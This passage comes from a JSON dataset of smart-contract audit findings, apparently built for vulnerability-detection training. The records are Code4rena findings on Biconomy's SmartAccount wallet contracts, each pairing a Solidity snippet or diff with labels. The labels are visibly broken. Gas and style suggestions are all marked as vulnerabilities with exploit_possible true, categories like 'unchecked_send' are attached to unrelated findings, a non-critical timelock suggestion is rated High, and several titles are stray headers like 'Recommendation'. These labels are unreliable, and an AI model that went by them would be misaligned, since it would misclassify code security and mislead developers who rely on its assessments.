    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n  167:         require(owner == address(0), \"Already initialized\");\n  168:         require(address(_entryPoint) == address(0), \"Already initialized\");\n  169:         require(_owner != address(0),\"Invalid owner\");\n  170:         require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n  171:         require(_handler != address(0), \"Invalid Entrypoint\");\n  172:         owner = _owner;\n  173:         _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n  174:         if (_handler != address(0)) internalSetFallbackHandler(_handler);\n  175:         setupModules(address(0), bytes(\"\"));\n  176:     }\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-11] init() function can be called by anybody",
    "description": "`init()` function can be called anybody when the contract is not initialized. More importantly, if someone else runs this function, they will have full authority because of the `owner` state variable. Here is a definition of `init()` function. contracts/smart-contract-wallet/SmartAccount.sol: 166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.791,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  192:     function execTransaction(\n  193:         Transaction memory _tx,\n  194:         uint256 batchId,\n  195:         FeeRefund memory refundInfo,\n  196:         bytes memory signatures\n  197:     ) public payable virtual override returns (bool success) {\n  198:         // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n  199:         //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n  200:         uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n  201:         //console.log(\"init %s\", 21000 + msg.data.length * 8);\n  202:         bytes32 txHash;\n  203:         // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n  204:         {\n  205:             bytes memory txHashData =\n  206:                 encodeTransactionData(\n  207:                     // Transaction info\n  208:                     _tx,\n  209:                     // Payment info\n  210:                     refundInfo,\n  211:                     // Signature info\n  212:                     nonces[batchId]\n  213:                 );\n  214:             // Increase nonce and execute transaction.\n  215:             // Default space aka batchId is 0\n  216:             nonces[batchId]++;\n  217:             txHash = keccak256(txHashData);\n  218:             checkSignatures(txHash, txHashData, signatures);\n  219:         }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[L-12] The minimum transaction value of 21,000 gas may change in the future",
    "description": "Any transaction has a 'base fee' of 21,000 gas in order to cover the cost of an elliptic curve operation that recovers the sender address from the signature, as well as the disk space of storing the transaction, according to the Ethereum White Paper. contracts/smart-contract-wallet/SmartAccount.sol: 192:     function execTransaction( 193:         Transaction memory _tx, 194:         uint256 batchId,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 31,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  108  \n  109:     function setOwner(address _newOwner) external mixedAuth {\n  110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n  111:         address oldOwner = owner;\n  112:         owner = _newOwner;\n  113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n  114:     }\n  115 \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N-06] Add a timelock to critical functions",
    "description": "It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user). Consider adding a timelock to: contracts/smart-contract-wallet/SmartAccount.sol: 108 109:     function setOwner(address _newOwner) external mixedAuth {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.405,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "only import what you need",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description",
    "description": "Solidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct `polluted the source code` with an unnecessary object we were not using because we did not need it. This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.025,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Include return parameters in NatSpec comments _Recommendation  Code Style: (from Uniswap3)_ /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\nthisFunctionCallIsReallyLong(\n    longArgument1,\n    longArgument2,\n    longArgument3\n);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Multiline output parameters and return statements should follow the same style recommended for wrapping long lines found in the Maximum Line Length section. https://docs.soliditylang.org/en/v0.8.17/style-guide.html#introduction thisFunctionCallIsReallyLong( longArgument1, longArgument2,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n /**\n  * @notice Sends ERC20 tokens trapped in contract to external address\n  * @dev Onlyowner is allowed to make this function call\n  * @param account is the receiving address\n  * @param externalToken is the token being sent\n  * @param amount is the quantity being sent\n  * @return boolean value indicating whether the operation succeeded.\n  *\n */\n  function rescueERC20(address account, address externalToken, uint256 amount) public onlyOwner returns (bool) {\n    IERC20(externalToken).transfer(account, amount);\n    return true;\n  }\n}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Add this code: /** * @notice Sends ERC20 tokens trapped in contract to external address * @dev Onlyowner is allowed to make this function call * @param account is the receiving address",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.548,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n10 results - 7 files\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  11:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  25:      ISignatureValidatorConstants,\n  36:     string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n  42:     bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n  48:     bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  11:     string public constant VERSION = \"1.0.2\";\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  28:     address private constant SIMULATE_FIND_AGGREGATOR = address(1);\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  12:     bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  16:     address internal constant SENTINEL_MODULES = address(0x1);\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  10:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "constants.sol",
    "description": "Use and import this file in contracts that require access to these values. This is just a suggestion, in some use cases this may result in higher gas usage in the distribution. 10 results - 7 files contracts/smart-contract-wallet/Proxy.sol: 11:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26; contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n72 results - 22 files\n\ncontracts/smart-contract-wallet/BaseSmartAccount.sol:\n  5: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  17:          assembly {\n  24:         // solhint-disable-next-line no-inline-assembly\n  25:         assembly {\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  142:         // solhint-disable-next-line no-inline-assembly\n  143:         assembly {\n  329:                 // solhint-disable-next-line no-inline-assembly\n  330:                 assembly {\n  337:                 // solhint-disable-next-line no-inline-assembly\n  338:                 assembly {\n  480:             assembly {\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  36:         // solhint-disable-next-line no-inline-assembly\n  37:         assembly {\n  55:         // solhint-disable-next-line no-inline-assembly\n  56:         assembly {\n\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol:\n  142:         // solhint-disable-next-line no-inline-assembly\n  143:         assembly {\n  324:                 // solhint-disable-next-line no-inline-assembly\n  325:                 assembly {\n  332:                 // solhint-disable-next-line no-inline-assembly\n  333:                 assembly {\n  470:             assembly {\n\ncontracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol:\n  5: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n    9: /* solhint-disable no-inline-assembly */\n  501:         assembly {offset := data}\n  505:         assembly {data := offset}\n  512:         assembly {mstore(0, number())}\n\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol:\n  19:         /* solhint-disable no-inline-assembly */\n  20:         assembly {\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  9: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n   4: /* solhint-disable no-inline-assembly */\n  39:         assembly {data := calldataload(userOp)}\n  63:         assembly {\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n   4: // solhint-disable no-inline-assembly\n  14:         assembly {\n  24:         assembly {\n  34:         assembly {\n  41:         assembly {\n  52:         assembly {\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  21:             // solhint-disable-next-line no-inline-assembly\n  22:             assembly {\n  26:             // solhint-disable-next-line no-inline-assembly\n  27:             assembly {\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  16:         // solhint-disable-next-line no-inline-assembly\n  17:         assembly {\n  34:         // solhint-disable-next-line no-inline-assembly\n  35:         assembly {\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n   87:         // solhint-disable-next-line no-inline-assembly\n   88:         assembly {\n  128:         // solhint-disable-next-line no-inline-assembly\n  129:         assembly {\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  18:         // solhint-disable-next-line no-inline-assembly\n  19:         assembly {\n\ncontracts/smart-contract-wallet/common/SignatureDecoder.sol:\n  22:         // solhint-disable-next-line no-inline-assembly\n  23:         assembly {\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  14:         // solhint-disable-next-line no-inline-assembly\n  15:         assembly {\n  21:         // solhint-disable-next-line no-inline-assembly\n  22:         assembly {\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  13:     // solhint-disable-next-line no-inline-assembly\n  14:     assembly { csize := extcodesize(account) }\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n   66:             assembly {\n   86:             assembly {\n  100:             assembly {\n\ncontracts/smart-contract-wallet/libs/MultiSend.sol:\n  28:         // solhint-disable-next-line no-inline-assembly\n  29:         assembly {\n\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol:\n  22:         // solhint-disable-next-line no-inline-assembly\n  23:         assembly {\n\ncontracts/smart-contract-wallet/libs/Strings.sol:\n  23:             /// @solidity memory-safe-assembly\n  24:             assembly {\n  29:                 /// @solidity memory-safe-assembly\n  30:                 assembly {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-23] Assembly Codes Specific \u2013 Should Have Comments",
    "description": "Since this is a low level language that is more difficult to parse by readers, include extensive documentation, comments on the rationale behind its use, clearly explaining what each assembly instruction does. This will make it easier for users to trust the code, for reviewers to validate the code, and for developers to build on or update the code. Note that using Assembly removes several important security features of Solidity, which can make the code more insecure and more error-prone. 72 results - 22 files contracts/smart-contract-wallet/BaseSmartAccount.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 120,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " to write *address storage values*  | 8 |\n| [G-22] |++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, as is the case when used in for- and while-loops| 6 |\n| [G-23] |Sort Solidity operations using short-circuit mode| 8 |\n| [G-24] |",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "Summary",
    "description": "| Number | Optimization Details | Context | |:--:|:-------| :-----:| | [G-01] | With assembly, `.call (bool success)` transfer can be done gas-optimized | 8 | | [G-02] |Remove the `initializer` modifier| 1 | | [G-03] |Structs can be packed into fewer storage slots |2 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.275,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\SmartAccount.sol#l451\n  449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n- 451:       (bool success,) = dest.call{value:amount}(\"\");\n+            bool success;                                 \n+            assembly {                                    \n+                success := call(gas(), dest, amount, 0, 0)\n+            }                                             \n+                                                          \n  452            require(success,\"transfer failed\");\n  453       }\n  454\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Gas",
    "title": "[G-01] With assembly, `.call (bool success)` transfer can be done gas-optimized",
    "description": "`return` data `(bool success,)` has to be stored due to EVM architecture, but in a usage like below, 'out' and 'outsize' values are given (0,0), this storage disappears and gas optimization is provided. https://twitter.com/pashovkrum/status/1607024043718316032?t=xs30iD6ORWtE2bTTYsCFIQ&s=19 There are 8 instances of the topic. contracts\\smart-contract-wallet\\SmartAccount.sol#l451 449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.589,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\UserOperation.sol:\n  19:     struct UserOperation {\n  20 \n  21         address sender;                // slot0   (20 bytes)\n- 22         uint256 nonce;                                      \n+ 22         uint96 nonce;                  // slot0   (12 bytes)\n- 23         bytes initCode;                                     \n- 24         bytes callData;                                     \n- 25         uint256 callGasLimit;                               \n- 26         uint256 verificationGasLimit;                       \n- 27         uint256 preVerificationGas;                         \n  28         uint128 maxFeePerGas;          // slot1   (16 bytes)\n  29         uint128 maxPriorityFeePerGas;  // slot1   (16 bytes)\n+ 25         uint256 callGasLimit;          // slot2   (32 bytes)\n+ 26         uint256 verificationGasLimit;  // slot3   (32 bytes)\n+ 27         uint256 preVerificationGas;    // slot4   (32 bytes)\n+ 23         bytes initCode;                // slot5   (32 bytes)\n+ 24         bytes callData;                // slot6   (32 bytes)\n  30         bytes paymasterAndData;        // slot7   (32 bytes)\n  31         bytes signature;               // slot8   (32 bytes)\n  32     } \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-03] Structs can be packed into fewer storage slots",
    "description": "The `UserOperation` struct can be packed into one slot less slot as suggested below. scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\UserOperation.sol: 19:     struct UserOperation { 20 21         address sender;                // slot0   (20 bytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\IStakeManager.sol:\n  53:     struct DepositInfo {   \n+             StakeInfo stakeInfo;   \n  54          uint112 deposit;   \n  55          bool staked;   \n- 56          uint112 stakes;        \n- 57          uint32 unstakeDelaySec;\n  58          uint64 withdrawTime;   \n  59     }   \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-04] `DepositInfo` and `PaymasterData` structs can be rearranged",
    "description": "Gas saving can be achieved by updating the ``DepositInfo`` struct as below. scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\IStakeManager.sol: 53:     struct DepositInfo { +             StakeInfo stakeInfo; 54          uint112 deposit;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.353,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n modifer check (address checkToAddress) {\n        require(checkToAddress != address(0) && checkToAddress != SENTINEL_MODULES, \"BSA101\");\n        _;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Recommendation",
    "description": "You can consider adding a modifier like below. modifer check (address checkToAddress) { require(checkToAddress != address(0) && checkToAddress != SENTINEL_MODULES, \"BSA101\"); _; }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.163,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\base\\Executor.sol:\n- event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n- event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n+ event Execution(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas, bool success);\n\n  13     function execute(\n  31         // Emit events here..\n- 32:         if (success) emit ExecutionSuccess(to, value, data, operation, txGas);\n- 33:         else emit ExecutionFailure(to, value, data, operation, txGas);\n+             emit Execution (to, value, data, operation, txGas, success);\n  34     }\n  35     \n  36 }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-07] Instead of `emit ExecutionSuccess` and `emit ExecutionFailure` a single ` emit Execution` is gas efficient",
    "description": "If the `emit ExecutionSuccess` and `emit ExecutionFailure` at the end of the `execute` function are removed and arranged as follows, gas savings will be achieved. The last element of the `event Execution` bool success will indicate whether the operation was successful or unsuccessful, with a value of true or false. contracts\\smart-contract-wallet\\base\\Executor.sol: - event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); - event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); + event Execution(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas, bool success);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.709,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\ncontracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol:\n  41:         require(newAmount <= type(uint112).max, \"deposit overflow\");\n\n  65:         require(stake < type(uint112).max, \"stake overflow\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-13] Use constants instead of type(uintx).max",
    "description": "type(uint120).max or type(uint112).max, etc. it uses more gas in the distribution process and also for each transaction than constant usage. 3 results - 2 files: contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol: 397:       require(maxGasValues <= type(uint120).max, \"AA94 gas values overflow\"); [EntryPoint.sol#L397](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L397)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.216,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  56        uint256 currentBalance = paymasterIdBalances[msg.sender];\n  57        require(amount <= currentBalance, \"Insufficient amount to withdraw\");\n  58:       paymasterIdBalances[msg.sender] -= amount;\n ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-14] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require` or `if` statement",
    "description": "require(a <= b); x = b - a => require(a <= b); unchecked { x = b - a } if(a <= b); x = b - a => if(a <= b); unchecked { x = b - a } This will stop the check for overflow and underflow so it will save gas. 2 results - 2 files: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.313,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[StakeManager.sol#L42](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L42), [StakeManager.sol#L59](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L59), [StakeManager.sol#L69](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L69), [StakeManager.sol#L84](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L84), [StakeManager.sol#L118](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L118)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "[G-15] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
    "description": "When using elements that are smaller than 32 bytes, your contracts gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed. 8 results - 3 files: contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.813,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[SmartAccount.sol#L109](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109), [SmartAccount.sol#L120](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L120), [SmartAccount.sol#L127](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L127), [SmartAccount.sol#L449](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449), [SmartAccount.sol#L455](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455), [SmartAccount.sol#L460](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460), [SmartAccount.sol#L465](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465), [SmartAccount.sol#L489](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489), [SmartAccount.sol#L536](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L536)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Gas",
    "title": "[G-19]  Functions guaranteed to revert_ when callled by normal users can be marked `payable`",
